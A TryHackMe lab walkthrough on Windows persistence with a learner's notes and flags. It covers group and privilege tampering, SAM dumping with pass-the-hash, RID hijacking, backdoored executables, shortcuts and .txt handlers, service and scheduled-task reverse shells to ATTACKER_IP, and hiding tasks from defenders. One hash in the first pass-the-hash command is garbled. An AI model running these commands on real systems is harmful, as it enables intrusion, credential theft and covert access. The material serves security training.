# Introduction
---

![Room Icon](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1a73b2609190f98fe926361dfe61b910.png)  

After gaining the first foothold on your target's internal network, you'll want to ensure you don't lose access to it before actually getting to the crown jewels. EstablishingÂ persistenceÂ is one of the first tasks we'll have as attackers when gaining access to a network. In simple terms,Â persistenceÂ refers to creating alternate ways to regain access to a host without going through the exploitation phase all over again.

![Backdoored Phone](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/54fc4f7dd3d53953f9d5dbfb932b9d26.png)

There are many reasons why you'd want to establishÂ persistenceÂ as quick as possible, including:

- **Re-exploitation isn't always possible**: Some unstable exploits might kill the vulnerable process during exploitation, getting you a single shot at some of them.
- **Gaining a foothold is hard to reproduce**: For example, if you used aÂ phishingÂ campaign to get your first access, repeating it to regain access to a host is simply too much work. Your second campaign might also not be as effective, leaving you with no access to the network.
- **TheÂ blue teamÂ is after you**: Any vulnerability used to gain your first access might be patched if your actions get detected. You are in a race against the clock!

While you could do with keeping some administrator's password hash and reusing it to connect back, you always risk those credentials getting rotated at some point. Plus, there are sneakier ways in which you could regain access to a compromised machine, making life harder for theÂ blue team.

In this room, we'll look at the most common techniques attackers use to establishÂ persistenceÂ in Windows systems. Before going into this room, it is recommended to be familiar with Windows systems fundamentals. You can check rooms on the matter in the following links:

- [Windows Fundamentals 1](https://tryhackme.com/room/windowsfundamentals1xbx)
- [Windows Fundamentals 2](https://tryhackme.com/room/windowsfundamentals2x0x)

PowershellÂ is also used extensively throughout this room. You can learn more about it in theÂ [Hacking withÂ Powershell](https://tryhackme.com/room/powershell)Â room.



# Tampering With Unprivileged Accounts
---

Having an administrator's credential would be the easiest way to achieveÂ persistenceÂ in a machine. However, to make it harder for theÂ blue teamÂ to detect us, we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.

Click theÂ **Start Machine**Â button on this task before continuing. The machine will be available on your web browser, but if you prefer connecting viaÂ RDP, you can use the following credentials:

![THM key](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94fe3c0f556877a2721ca9e0744ad026.png)

|   |   |
|---|---|
|**Username**|Administrator|
|**Password**|Password321|

**Note:**Â When you log in viaÂ RDP, the existing in-browser view will be disconnected. After you terminate yourÂ RDPÂ session you can get the in-browser view back by pressingÂ **Reconnect**.  

Notice that we assume you have already gained administrative access somehow and are trying to establishÂ persistenceÂ from there.

### Assign Group Memberships

For this part of the task, we will assume you have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of theÂ **Administrators**Â group. We can easily achieve this with the following command:

```powershell
C:\> net localgroup administrators thmuser0 /add
```

This will allow you to access the server by usingÂ RDP, WinRM or any other remote administration service available.

If this looks too suspicious, you can use theÂ **Backup Operators**Â group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configuredÂ DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially.

To do so, we begin by adding the account to the Backup Operators group:

```shell-session
C:\> net localgroup "Backup Operators" thmuser1 /add
```

Since this is an unprivileged account, it cannotÂ RDPÂ or WinRM back to the machine unless we add it to theÂ **Remote Desktop Users**Â (RDP) orÂ **Remote Management Users**Â (WinRM) groups. We'll use WinRM for this task:

```shell-session
C:\> net localgroup "Remote Management Users" thmuser1 /add
```

We'll assume we have already dumped the credentials on the server and have thmuser1's password. Let's connect via WinRM using its credentials:

![THM key](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94fe3c0f556877a2721ca9e0744ad026.png)

|   |   |
|---|---|
|**Username**|thmuser1|
|**Password**|Password321|

If you tried to connect right now from your attacker machine, you'd be surprised to see that even if you are on the Backups Operators group, you wouldn't be able to access all files as expected. A quick check on our assigned groups would indicate that we are a part of Backup Operators, but the group is disabled:


```shell-session
user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321

*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

This is due to User Account Control (UAC). One of the features implemented byÂ UAC,Â **LocalAccountTokenFilterPolicy**, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges throughÂ UACÂ from a graphical user session (Read more onÂ UACÂ [here](https://tryhackme.com/room/windowsfundamentals1xbx)), if you are using WinRM, you are confined to a limited access token with no administrative privileges.

To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:

```shell-session
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Once all of this has been set up, we are ready to use our backdoor user. First, let's establish a WinRM connection and check that the Backup Operators group is enabled for our user:


```shell-session
user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
        
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:


```shell-session
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```

**Note:**Â If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.

With those files, we can dump the password hashes for all users usingÂ `secretsdump.py`Â or other similar tools:


```shell-session
user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6:::
thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:::
[*] Cleaning up...
```

And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:

```shell-session
user@AttackBox$ evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4899f69e89088c4cb4bbdaa3cb4bbdaa3
```

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png)

Using the Administrator console gained through the thmuser1, executeÂ `C:\flags\flag1.exe`Â to retrieve your flag.


#### Practical
---

Let's use these commands on the windows machine:

```
net localgroup "Backup Operators" thmuser1 /add
net localgroup "Remote Management Users" thmuser1 /add
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 
```

![Pasted image 20250515151535.png](../../../IMAGES/Pasted%20image%2020250515151535.png)

We are now able to get access as `thmuser1`:

```
evil-winrm -i IP -u thmuser1 -p Password321
```

Inside of this shell, we need to do:

```
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
```

Once we've saved all of that, we can use `impacket-secretsdump`:

```
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
thmuser1:1008:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser2:1009:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser3:1010:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
```


We got our hashes, let's go into the administrator account using this hash:

```
evil-winrm -i IP -u Administrator -H f3118544a831e728781d780cfdb9c1fa
```


We can now get our flag 1:

```
*Evil-WinRM* PS C:\flags> .\flag1.exe
THM{FLAG_BACKED_UP!}
```



### Special Privileges and Security Descriptors

A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default.Â **Privileges**Â are simply the capacity to do a task on the system itself. They include simple things like having the capabilities to shut down the server up to very privileged operations like being able to take ownership of any file on the system. A complete list of available privileges can be foundÂ [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)Â for reference.

In the case of the Backup Operators group, it has the following two privileges assigned by default:

- **SeBackupPrivilege:**Â The user can read any file in the system, ignoring anyÂ DACLÂ in place.
- **SeRestorePrivilege:**Â The user can write any file in the system, ignoring anyÂ DACLÂ in place.

We can assign such privileges to any user, independent of their group memberships. To do so, we can use theÂ `secedit`Â command. First, we will export the current configuration to a temporary file:

```powershell
secedit /export /cfg config.inf
```

We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:

![config.inf contents](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/765671a0355e2260c44e5a12a10f090e.png)  

We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:

```powershell
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

You should now have a user with equivalent privileges to any Backup Operator. The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow thmuser2 to connect. Think of aÂ **security descriptor**Â as anÂ ACLÂ but applied to other system facilities.

To open the configuration window for WinRM's security descriptor, you can use the following command inÂ PowershellÂ (you'll need to use theÂ GUIÂ session for this):

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:

![WinRM security descriptor](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/380c80b98c4d1f8c2149ef72427cfeb0.png)  

Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.

Notice that for this user to work with the given privileges fully, you'd have to change theÂ **LocalAccountTokenFilterPolicy**Â registry key, but we've done this already to get the previous flag.

If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!


```shell-session
C:\> net user thmuser2
User name                    thmuser2

Local Group Memberships      *Users
Global Group memberships     *None
```

Once again, we'll assume we have already dumped the credentials on the server and have thmuser2's password. Let's connect with its credentials using WinRM:

![THM key](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94fe3c0f556877a2721ca9e0744ad026.png)

|   |   |
|---|---|
|**Username**|thmuser2|
|**Password**|Password321|

We can log in with those credentials to obtain the flag.

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png)

Log in to the machine via WinRM using thmuser2 and executeÂ `C:\flags\flag2.exe`Â to retrieve your flag.

Once we did all that, we can get the flag:

```
*Evil-WinRM* PS C:\flags> .\flag2.exe
THM{IM_JUST_A_NORMAL_USER}
```

### RID Hijacking

Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.

When a user is created, an identifier calledÂ **Relative ID (RID)**Â is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

In any Windows system, the default Administrator account is assigned theÂ **RID = 500**, and regular users usually haveÂ **RID >= 1000**.

To find the assigned RIDs for any user, you can use the following command:


```shell-session
C:\> wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
```

The RID is the last bit of the SID (1010 for thmuser3 and 500 for Administrator). The SID is an identifier that allows the operating system to identify a user across a domain, but we won't mind too much about theÂ restÂ of it for this task.

Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec, available inÂ `C:\tools\pstools`Â in your machine:

```shell-session
C:\tools\pstools> PsExec64.exe -i -s regedit
```

From Regedit, we will go toÂ `HKLM\SAM\SAM\Domains\Account\Users\`Â where there will be a key for each user in the machine. Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value calledÂ **F**, which holds the user's effective RID at position 0x30:

![RID hijacking 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d630140974989748ebcf150ba0696d14.png)  

Notice the RID is stored using little-endian notation,Â so its bytes appear reversed.

We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):

![RID hijacking 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8f2072b6d13b7343cf7b890586703ddf.png)  

The next time thmuser3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.

For this task, we assume you have already compromised the system and obtained the password for thmuser3. For your convenience, the user can connect viaÂ RDPÂ with the following credentials:

![THM key](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94fe3c0f556877a2721ca9e0744ad026.png)

|   |   |
|---|---|
|**Username**|thmuser3|
|**Password**|Password321|

If you did everything correctly, you should be logged in to the Administrator's desktop.Â 

  
Note:Â When you log in viaÂ RDP, the existing in-browser view will be disconnected. After you terminate yourÂ RDPÂ session you can get the in-browser view back by pressingÂ Reconnect.

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png)

Log in to the machine viaÂ RDPÂ using thmuser3 and executeÂ `C:\flags\flag3.exe`Â to retrieve your flag.

Once we do all that, we will get flag3:

```
THM{TRUST_ME_IM_AN_ADMIN}
```


# Backdooring Files
----

Another method of establishingÂ persistenceÂ consists of tampering with some files we know the user interacts with regularly. By performing some modifications to such files, we can plant backdoors that will get executed whenever the user accesses them. Since we don't want to create any alerts that could blow our cover, the files we alter must keep working for the user as expected.

While there are many opportunities to plant backdoors, we will check the most commonly used ones.

## Executable Files

If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points toÂ `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

You can easily plant a payload of your preference in any .exe file withÂ `msfvenom`. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:

```shell-session
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcpÂ meterpreterÂ payload without the user noticing it. While this method is good enough to establishÂ persistence, let's look at other sneakier techniques.

### Shortcut Files

If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.

For this task, let's check the shortcut toÂ **calc**Â on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:

![calc properties](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7a7349b9dcc5af3180044ee1d7605967.png)  

Before hijacking the shortcut's target, let's create a simpleÂ PowershellÂ script inÂ `C:\Windows\System32`Â or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

Finally, we'll change the shortcut to point to our script. Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user. We also want to run our script on a hidden window, for which we'll add theÂ `-windowstyle hidden`Â option toÂ Powershell. The final target of the shortcut would be:

```powershell
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

![backdoored lnk file](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fe703ddea6135e0c867afcc6f61a8cd2.png)  

Let's start an nc listener to receive our reverse shell on our attacker's machine:

```shell-session
user@AttackBox$ nc -lvp 4445
```

If you double-click the shortcut, you should get a connection back to your attacker's machine. Meanwhile, the user will get a calculator just as expected by them. You will probably notice a command prompt flashing up and disappearing immediately on your screen. A regular user might not mind too much about that, hopefully.Â 

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png)
ExecuteÂ `C:\flags\flag5.exe`Â from your reverse shell to get your flag!


Once we do all that, we will get a shell as administrator:

![Pasted image 20250515163008.png](../../../IMAGES/Pasted%20image%2020250515163008.png)

Let's get our flag:

```
C:\flags>.\flag5.exe

THM{NO_SHORTCUTS_IN_LIFE}
```

## Hijacking File Associations

In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.

The default operating system file associations are kept inside the registry, where a key is stored for every single file type underÂ `HKLM\Software\Classes\`. Let's say we want to check which program is used to open .txt files; we can just go and check for theÂ `.txt`Â subkey and find whichÂ **Programmatic ID (ProgID)**Â is associated with it. A ProgID is simply an identifier to a program installed on the system. For .txt files, we will have the following ProgID:

![File extensions in registry](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3ae1b8356b38a349090e836026d6d480.png)  

We can then search for a subkey for the corresponding ProgID (also underÂ `HKLM\Software\Classes\`), in this case,Â `txtfile`, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey underÂ `shell\open\command`Â where the default command to be run for files with that extension is specified:

![ProgID in registry](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c3565cf93de4990f41f41b25aed80571.png)  

In this case, when you try to open a .txt file, the system will executeÂ `%SystemRoot%\system32\NOTEPAD.EXE %1`, whereÂ `%1`Â represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it toÂ `C:\Windows\backdoor2.ps1`:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Notice how inÂ Powershell, we have to passÂ `$args[0]`Â to notepad, as it will contain the name of the file to be opened, as given throughÂ `%1`.

Now let's change the registry key to run our backdoor script in a hidden window:

![backdoored ProgID](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f7ed25a701cf20ea85cf333b20708ffe.png)  

Finally, create a listener for your reverse shell and try to open any .txt file on the victim machine (create one if needed). You should receive a reverse shell with the privileges of the user opening the file.

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png)

Once you have backdoored the .txt file handler and spawned a reverse shell, runÂ `C:\flags\flag6.exe`Â to get a flag!


Once we follow all steps and open a `.txt` file, we will receive a shell:

![Pasted image 20250515163552.png](../../../IMAGES/Pasted%20image%2020250515163552.png)

```
C:\flags>.\flag6.exe
THM{TXT_FILES_WOULD_NEVER_HURT_YOU}
```

# Abusing Services
---

Windows services offer a great way to establishÂ persistenceÂ since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.

A service is basically an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.

There are two main ways we can abuse services to establishÂ persistence: either create a new service or modify an existing one to execute our payload.

## Creating backdoor services

We can create and start a service named "THMservice" using the following commands:

```shell-session
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

**Note:**Â There must be a space after each equal sign for the command to work.

The "net user" command will be executed when the service is started, resetting the Administrator's password toÂ `Passwd123`. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.

Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use theÂ `exe-service`Â format in msfvenom:


```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

You can then copy the executable to your target system, say inÂ `C:\Windows`Â and point the service's binPath to it:

```shell-session
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

This should create a connection back to your attacker's machine.

```
powershell -ExecutionPolicy Bypass -Command `
  "Invoke-WebRequest -Uri http://IP:8000/rev-svc.exe `
                     -OutFile C:\Windows\Temp\rev-svc.exe"

```

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png)

Use the reverse shell you just gained to executeÂ `C:\flags\flag7.exe`


Once we did all steps, we get a shell:

![Pasted image 20250515164255.png](../../../IMAGES/Pasted%20image%2020250515164255.png)

Let's get our flag:

```
C:\flags>.\flag7.exe

THM{SUSPICIOUS_SERVICES}
```

## Modifying existing services

While creating new services forÂ persistenceÂ works quite well, theÂ blue teamÂ may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.

You can get a list of available services using the following command:

```shell-session
C:\> sc.exe query state=all
SERVICE_NAME: THMService1
DISPLAY_NAME: THMService1
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

You should be able to find a stopped service called THMService3. To query the service's configuration, you can use the following command:


```shell-session
C:\> sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMService3
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```

There are three things we care about when using a service forÂ persistence:

- The executable (**BINARY_PATH_NAME**) should point to our payload.
- The serviceÂ **START_TYPE**Â should be automatic so that the payload runs without user interaction.
- TheÂ **SERVICE_START_NAME**, which is the account under which the service will run, should preferably be set toÂ **LocalSystem**Â to gain SYSTEM privileges.

Let's start by creating a new reverse shell with msfvenom:

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

To reconfigure "THMservice3" parameters, we can use the following command:

```shell-session
C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

You can then query the service's configuration again to check if all went as expected:

```shell-session
C:\> sc.exe qc THMservice3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png)

Start aÂ MetasploitÂ listener on your attacker's machine and manually start the service to receive a reverse shell. From there, runÂ `C:\flags\flag8.exe`Â to get a flag!


Once we did all that, we will receive a shell:

![Pasted image 20250515164758.png](../../../IMAGES/Pasted%20image%2020250515164758.png)

```
C:\flags>.\flag8.exe
THM{IN_PLAIN_SIGHT}
```

# Abusing Scheduled Tasks
----

We can also use scheduled tasks to establishÂ persistenceÂ if needed. There are several ways to schedule the execution of a payload in Windows systems. Let's look at some of them:

## Task Scheduler

The most common way to schedule tasks is using the built-inÂ **Windows task scheduler**. The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, you can useÂ `schtasks`Â to interact with the task scheduler. A complete reference for the command can be found onÂ [Microsoft's website](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks).

Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often, but we don't want to wait too long for this room:


```shell-session
C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
```

**Note:**Â Be sure to useÂ `THM-TaskBackdoor`Â as the name of your task, or you won't get the flag.

The previous command will create a "THM-TaskBackdoor" task and execute anÂ `nc64`Â reverse shell back to the attacker. TheÂ `/sc`Â andÂ `/mo`Â options indicate that the task should be run every single minute. TheÂ `/ru`Â option indicates that the task will run with SYSTEM privileges.

To check if our task was successfully created, we can use the following command:


```shell-session
C:\> schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
```

## Making Our Task Invisible

Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting itsÂ **Security Descriptor (SD)**. The security descriptor is simply anÂ ACLÂ that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.

The security descriptors of all scheduled tasks are stored inÂ `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. You will find a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.

